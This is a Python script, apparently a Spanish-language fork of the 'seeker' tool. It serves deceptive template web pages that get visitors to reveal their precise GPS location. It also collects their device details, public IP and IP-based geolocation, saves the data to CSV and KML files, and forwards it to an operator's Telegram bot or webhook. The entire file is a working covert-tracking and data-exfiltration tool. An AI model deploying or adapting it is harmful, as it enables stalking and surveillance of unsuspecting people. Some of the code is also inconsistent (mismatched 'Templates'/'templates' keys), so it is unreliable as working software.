#!/usr/bin/env python3

VERSION = '1.3.1'

R = '\033[31m'  # rojo
G = '\033[32m'  # verde
C = '\033[36m'  # cyan
W = '\033[0m'   # blanco
Y = '\033[33m'  # amarillo

import sys
import utils
import argparse
import requests
import traceback
import shutil
from time import sleep
from os import path, kill, mkdir, getenv, environ, remove, devnull
from json import loads, decoder
from packaging import version

parser = argparse.ArgumentParser()
parser.add_argument('-k', '--kml', help='KML filename')
parser.add_argument('-p', '--port', type=int, default=8080, help='Web server port [ Default : 8080 ]')
parser.add_argument('-u', '--update', action='store_true', help='Check for updates')
parser.add_argument('-v', '--version', action='store_true', help='Prints version')
parser.add_argument('-t', '--template', type=int, help='Load template and loads parameters from env variables')
parser.add_argument('-d', '--debugHTTP', type=bool, default=False, help='Disable HTTPS redirection for testing only')
parser.add_argument('-tg', '--telegram', help='Telegram bot API token [ Format -> token:chatId ]')
parser.add_argument('-wh', '--webhook', help='Webhook URL [ POST method & unauthenticated ]')

args = parser.parse_args()
kml_fname = args.kml
port = getenv('PORT') or args.port
chk_upd = args.update
print_v = args.version
telegram = getenv('TELEGRAM') or args.telegram
webhook = getenv('WEBHOOK') or args.webhook

if (getenv('DEBUG_HTTP') and (getenv('DEBUG_HTTP') == '1' or getenv('DEBUG_HTTP').lower() == 'true')) or args.debugHTTP is True:
	environ['DEBUG_HTTP'] = '1'
else:
	environ['DEBUG_HTTP'] = '0'

templateNum = int(getenv('TEMPLATE')) if getenv('TEMPLATE') and getenv('TEMPLATE').isnumeric() else args.template

path_to_script = path.dirname(path.realpath(__file__))

SITE = ''
SERVER_PROC = ''
LOG_DIR = f'{path_to_script}/logs'
DB_DIR = f'{path_to_script}/db'
LOG_FILE = f'{LOG_DIR}/php.log'
DATA_FILE = f'{DB_DIR}/results.csv'
INFO = f'{LOG_DIR}/info.txt'
RESULT = f'{LOG_DIR}/result.txt'
TEMPLATES_JSON = f'{path_to_script}/template/templates.json'
TEMP_KML = f'{path_to_script}/template/sample.kml'
META_FILE = f'{path_to_script}/metadata.json'
META_URL = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/metadata.json'
PID_FILE = f'{path_to_script}/pid'

if not path.isdir(LOG_DIR):
	mkdir(LOG_DIR)

if not path.isdir(DB_DIR):
	mkdir(DB_DIR)


def chk_update():
	try:
		print('> Obteniendo metadatos...', end='')
		rqst = requests.get(META_URL, timeout=5)
		meta_sc = rqst.status_code
		if meta_sc == 200:
			print('OK')
			metadata = rqst.text
			json_data = loads(metadata)
			gh_version = json_data['version']
			if version.parse(gh_version) > version.parse(VERSION):
				print(f'> ¡ACTUALIZACION DISPONIBLE! : {gh_version}')
			else:
				print('> Estas actualizado.')
	except Exception as exc:
		utils.print(f'Exception : {str(exc)}')


if chk_upd is True:
	chk_update()
	sys.exit()

if print_v is True:
	utils.print(VERSION)
	sys.exit()

import socket
import importlib
from csv import writer
import subprocess as subp
from ipaddress import ip_address
from signal import SIGTERM

# temporary workaround for psutil exception on termux
with open(devnull, 'w') as nf:
	sys.stderr = nf
	import psutil
sys.stderr = sys.__stderr__


def banner():
	with open(META_FILE, 'r') as metadata:
		json_data = loads(metadata.read())
		twitter_url = json_data['twitter']
		comms_url = json_data['comms']

	art = r'''
 
						@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
      					@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%./##           ,%.@@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/*  *%(/*,*...***,,,,,&@@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&# */*,...      ./ %  %%@@@@@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@@@@@@@@@@@@@* *.,         .   .*   .%@@@@@@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@@@@@@@@@@@,* . ,  ,*,..    .. .%      &@@@@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@@@@@@@@@@/   %. ( *,..*  /    (       , ,#&@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@@@@@@@@@. , #*  //       .,  .(/   .##/. /@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@@@@@@@@#(.. .. * ,.  .,  */*   .%((.  . .&@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@@@@@@@@@%. /,,(.., *..#,.   ****%*(/((,.(%&@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@@@@@@@@@,, .&*. ,,%#/#***((*/&%//#,      @@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@@@@@@@@@@&*(    (//%#*&/(*#/((#(  .,**,.#@@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@@@@@@@@@@@&(,**#*&*#(/##%*#,*      ,    (@@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@@@@@@@@@@@@%(/#@%#**(//,,..              &@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@@@@@@@@@@@,%/**#%////(/**,           . . %@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@@@@@@@@@@@@%#(%*#(**#/&. .*           *,@@@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@@@@@@@#&.#*%%***/*///%..  .,,        (*@@@@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@@@@@&%*(&#((%/**%///#/.    ..,,&,    ,@@@@@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@@@##%*/(*(%&@%%((*(/#/.     .,,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@%*#(*/(&**&%&&*/@&(*#.       *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@%(//#%%/,*,,* .* (...        ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@@@*#,#*%(*,.#* (.*&.        .@/(&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@@% ,..*%...**(%@/#/*/,  (/,  ,,,#((&@@@@@@@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@#.,,,.         ,& / / ,.*/*... ./%,* *@@@@@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@/,(,             , *, *   ,./*. *..(./*@@@@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@@  *.             # /#.  ,    , / . ,*.*#@@@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@@%,,*.             ( #.*.  .   . * , /*.(, *@@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@@*(**@.             * /.#*.       . / . #/.  #@@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@%*. ((.            ,/ /(,/,,       . .( ,*.. ,&@@@@@@@@@@@@@@@@@@@@
						@@@@@@@@@@@@@(,, (,..           %*/#*,*,,        ...*.(.. *#@%.,*@@@@@@@@@@@@@@@
						@@@@@@@@@@@@, *  (,,..         ./. .../*,/. ..    ../*,,..,(@%.. .@@@@@@@@@@@@@@
 .----------------.  .----------------.  .----------------.  .----------------.  .-----------------. .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |      __      | || |  _________   | || |  ____  ____  | || |  _________   | || | ____  _____  | || |  _________   | || |      __      | |
| |     /  \     | || | |  _   _  |  | || | |_   ||   _| | || | |_   ___  |  | || ||_   \|_   _| | || | |_   ___  |  | || |     /  \     | |
| |    / /\ \    | || | |_/ | | \_|  | || |   | |__| |   | || |   | |_  \_|  | || |  |   \ | |   | || |   | |_  \_|  | || |    / /\ \    | |
| |   / ____ \   | || |     | |      | || |   |  __  |   | || |   |  _|  _   | || |  | |\ \| |   | || |   |  _|  _   | || |   / ____ \   | |
| | _/ /    \ \_ | || |    _| |_     | || |  _| |  | |_  | || |  _| |___/ |  | || | _| |_\   |_  | || |  _| |___/ |  | || | _/ /    \ \_ | |
| ||____|  |____|| || |   |_____|    | || | |____||____| | || | |_________|  | || ||_____|\____| | || | |_________|  | || ||____|  |____|| |
| |              | || |              | || |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
 			'''
	utils.print(f'{G}{art}{W}\n')
	utils.print(f'{G}[>] {C}Creado por   : {W}Olimpos team')
	#utils.print(f'{G} |---> {C}Twitter   : {W}{twitter_url}')
	#utils.print(f'{G} |---> {C}Community : {W}{comms_url}')
	utils.print(f'{G}[>] {C}Version      : {W}{VERSION}\n')


def send_webhook(content, msg_type):
	if webhook is not None:
		if not webhook.lower().startswith('http://') and not webhook.lower().startswith('https://'):
			utils.print(f'{R}[-] {C}Protocolo perdido, incluye http:// ó https://{W}')
			return
		if webhook.lower().startswith('https://discord.com/api/webhooks'):
			from discord_webhook import discord_sender
			discord_sender(webhook, msg_type, content)
		else:
			requests.post(webhook, json=content)


def send_telegram(content, msg_type):
	if telegram is not None:
		tmpsplit = telegram.split(':')
		if len(tmpsplit) < 3:
			utils.print(f'{R}[-] {C}formtao de API en telegram -> token:chatId{W}')
			return
		from telegram_api import tgram_sender
		tgram_sender(msg_type, content, tmpsplit)


def template_select(site):
	utils.print(f'{Y}[!] Selecciona una plantilla :{W}\n')

	with open(TEMPLATES_JSON, 'r') as templ:
		templ_info = templ.read()

	templ_json = loads(templ_info)

	for item in templ_json['Templates']:
		name = item['name']
		utils.print(f'{G}[{templ_json["templates"].index(item)}] {C}{name}{W}')

	try:
		selected = -1
		if templateNum is not None:
			if templateNum >= 0 and templateNum < len(templ_json['templates']):
				selected = templateNum
		else:
			selected = int(input(f'{G}[>] {W}'))
		if selected < 0:
			print()
			utils.print(f'{R}[-] {C}Entrada invalida!{W}')
			sys.exit()
	except ValueError:
		print()
		utils.print(f'{R}[-] {C}Entrada invalida!{W}')
		sys.exit()

	try:
		site = templ_json['templates'][selected]['dir_name']
	except IndexError:
		print()
		utils.print(f'{R}[-] {C}Invalid Input!{W}')
		sys.exit()

	print()
	utils.print(f'{G}[+] {C}Loading {Y}{templ_json["templates"][selected]["name"]} {C}Template...{W}')

	imp_file = templ_json['templates'][selected]['import_file']
	importlib.import_module(f'template.{imp_file}')
	shutil.copyfile('php/error.php', f'template/{templ_json["templates"][selected]["dir_name"]}/error_handler.php')
	shutil.copyfile('php/info.php', f'template/{templ_json["templates"][selected]["dir_name"]}/info_handler.php')
	shutil.copyfile('php/result.php', f'template/{templ_json["templates"][selected]["dir_name"]}/result_handler.php')
	jsdir = f'template/{templ_json["templates"][selected]["dir_name"]}/js'
	if not path.isdir(jsdir):
		mkdir(jsdir)
	shutil.copyfile('js/location.js', jsdir + '/location.js')
	return site


def server():
	print()
	port_free = False
	utils.print(f'{G}[+] {C}Puerto : {W}{port}\n')
	utils.print(f'{G}[+] {C}iniciando servidor PHP...{W}', end='')
	cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', f'template/{SITE}/']

	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
		try:
			sock.connect(('127.0.0.1', port))
		except ConnectionRefusedError:
			port_free = True

	if not port_free and path.exists(PID_FILE):
		with open(PID_FILE, 'r') as pid_info:
			pid = int(pid_info.read().strip())
			try:
				old_proc = psutil.Process(pid)
				utils.print(f'{C}[ {R}✘{C} ]{W}')
				utils.print(f'{Y}[!] vieja instancia o php encontrado, reiniciando...{W}')
				utils.print(f'{G}[+] {C}Iniciando servidor PHP...{W}', end='')
				try:
					sleep(1)
					if old_proc.status() != 'running':
						old_proc.kill()
					else:
						utils.print(f'{C}[ {R}✘{C} ]{W}')
						utils.print(f'{R}[-] {C}no se puede cerrar el proceso PHP, hagalo manual{W}')
						sys.exit()
				except psutil.NoSuchProcess:
					pass
			except psutil.NoSuchProcess:
				utils.print(f'{C}[ {R}✘{C} ]{W}')
				utils.print(f'{R}[-] {C}Port {W}{port} {C}Esta siendo usado por otro servidor.{W}')
				sys.exit()
	elif not port_free and not path.exists(PID_FILE):
		utils.print(f'{C}[ {R}✘{C} ]{W}')
		utils.print(f'{R}[-] {C}Port {W}{port} {C}Esta siendo usado por otro servidor.{W}')
		sys.exit()
	elif port_free:
		pass

	with open(LOG_FILE, 'w') as phplog:
		proc = subp.Popen(cmd, stdout=phplog, stderr=phplog)
		with open(PID_FILE, 'w') as pid_out:
			pid_out.write(str(proc.pid))

		sleep(3)

		try:
			php_rqst = requests.get(f'http://127.0.0.1:{port}/index.html')
			php_sc = php_rqst.status_code
			if php_sc == 200:
				utils.print(f'{C}[ {G}✔{C} ]{W}')
				print()
			else:
				utils.print(f'{C}[ {R}Status : {php_sc}{C} ]{W}')
				cl_quit()
		except requests.ConnectionError:
			utils.print(f'{C}[ {R}✘{C} ]{W}')
			cl_quit()


def wait():
	printed = False
	while True:
		sleep(2)
		size = path.getsize(RESULT)
		if size == 0 and printed is False:
			utils.print(f'{G}[+] {C}Esperando respuesta...{Y}[ctrl+c para salir]{W}\n')
			printed = True
		if size > 0:
			data_parser()
			printed = False


def data_parser():
	data_row = []
	with open(INFO, 'r') as info_file:
		info_content = info_file.read()
	if not info_content or info_content.strip() == '':
		return
	try:
		info_json = loads(info_content)
	except decoder.JSONDecodeError:
		utils.print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
	else:
		var_os = info_json['os']
		var_platform = info_json['platform']
		var_cores = info_json['cores']
		var_ram = info_json['ram']
		var_vendor = info_json['vendor']
		var_render = info_json['render']
		var_res = info_json['wd'] + 'x' + info_json['ht']
		var_browser = info_json['browser']
		var_ip = info_json['ip']

		data_row.extend([var_os, var_platform, var_cores, var_ram, var_vendor, var_render, var_res, var_browser, var_ip])
		device_info = f'''{Y}[!] Informacion de dispositivo :{W}

{G}[+] {C}OS         : {W}{var_os}
{G}[+] {C}Platforma   : {W}{var_platform}
{G}[+] {C}CPU (nucleos)  : {W}{var_cores}
{G}[+] {C}RAM        : {W}{var_ram}
{G}[+] {C}GPU Vendor : {W}{var_vendor}
{G}[+] {C}GPU        : {W}{var_render}
{G}[+] {C}Resolution : {W}{var_res}
{G}[+] {C}Navegador    : {W}{var_browser}
{G}[+] {C}Public IP  : {W}{var_ip}
'''
		utils.print(device_info)
		send_telegram(info_json, 'device_info')
		send_webhook(info_json, 'device_info')

		if ip_address(var_ip).is_private:
			utils.print(f'{Y}[!] Omitiendo IP ya que la Ip es privada{W}')
		else:
			rqst = requests.get(f'https://ipwhois.app/json/{var_ip}')
			s_code = rqst.status_code

			if s_code == 200:
				data = rqst.text
				data = loads(data)
				var_continent = str(data['continent'])
				var_country = str(data['country'])
				var_region = str(data['region'])
				var_city = str(data['city'])
				var_org = str(data['org'])
				var_isp = str(data['isp'])

				data_row.extend([var_continent, var_country, var_region, var_city, var_org, var_isp])
				ip_info = f'''{Y}[!] IP Information :{W}

{G}[+] {C}Continente : {W}{var_continent}
{G}[+] {C}Pais   : {W}{var_country}
{G}[+] {C}Region    : {W}{var_region}
{G}[+] {C}Ciudad      : {W}{var_city}
{G}[+] {C}Org       : {W}{var_org}
{G}[+] {C}ISP       : {W}{var_isp}
'''
				utils.print(ip_info)
				send_telegram(data, 'ip_info')
				send_webhook(data, 'ip_info')

	with open(RESULT, 'r') as result_file:
		results = result_file.read()
		try:
			result_json = loads(results)
		except decoder.JSONDecodeError:
			utils.print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
		else:
			status = result_json['status']
			if status == 'Realizado con exito!':
				var_lat = result_json['lat']
				var_lon = result_json['lon']
				var_acc = result_json['acc']
				var_alt = result_json['alt']
				var_dir = result_json['dir']
				var_spd = result_json['spd']

				data_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])
				loc_info = f'''{Y}[!] Informacion de ubicacion :{W}

{G}[+] {C}Latitud  : {W}{var_lat}
{G}[+] {C}Longitud : {W}{var_lon}
{G}[+] {C}precision  : {W}{var_acc}
{G}[+] {C}Altitud  : {W}{var_alt}
{G}[+] {C}Direcion : {W}{var_dir}
{G}[+] {C}velocidad     : {W}{var_spd}
'''
				utils.print(loc_info)
				send_telegram(result_json, 'location')
				send_webhook(result_json, 'location')
				gmaps_url = f'{G}[+] {C}Google Maps : {W}https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'
				gmaps_json = {'url': f'https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'}
				utils.print(gmaps_url)
				send_telegram(gmaps_json, 'url')
				send_webhook(gmaps_json, 'url')

				if kml_fname is not None:
					kmlout(var_lat, var_lon)
			else:
				var_err = result_json['error']
				utils.print(f'{R}[-] {C}{var_err}\n')
				send_telegram(result_json, 'error')
				send_webhook(result_json, 'error')

	csvout(data_row)
	clear()
	return


def kmlout(var_lat, var_lon):
	with open(TEMP_KML, 'r') as kml_sample:
		kml_sample_data = kml_sample.read()

	kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
	kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))

	with open(f'{path_to_script}/{kml_fname}.kml', 'w') as kml_gen:
		kml_gen.write(kml_sample_data)

	utils.print(f'{Y}[!] Archivo KML generado!{W}')
	utils.print(f'{G}[+] {C}Path : {W}{path_to_script}/{kml_fname}.kml')


def csvout(row):
	with open(DATA_FILE, 'a') as csvfile:
		csvwriter = writer(csvfile)
		csvwriter.writerow(row)
	utils.print(f'{G}[+] {C}Datos guardados : {W}{path_to_script}/db/results.csv\n')


def clear():
	with open(RESULT, 'w+'):
		pass
	with open(INFO, 'w+'):
		pass


def repeat():
	clear()
	wait()


def cl_quit():
	with open(PID_FILE, 'r') as pid_info:
		pid = int(pid_info.read().strip())
		kill(pid, SIGTERM)
	remove(PID_FILE)
	sys.exit()


try:
	banner()
	clear()
	SITE = template_select(SITE)
	server()
	wait()
	data_parser()
except KeyboardInterrupt:
	utils.print(f'{R}[-] {C}Interrupcion del teclado.{W}')
	cl_quit()
else:
	repeat()
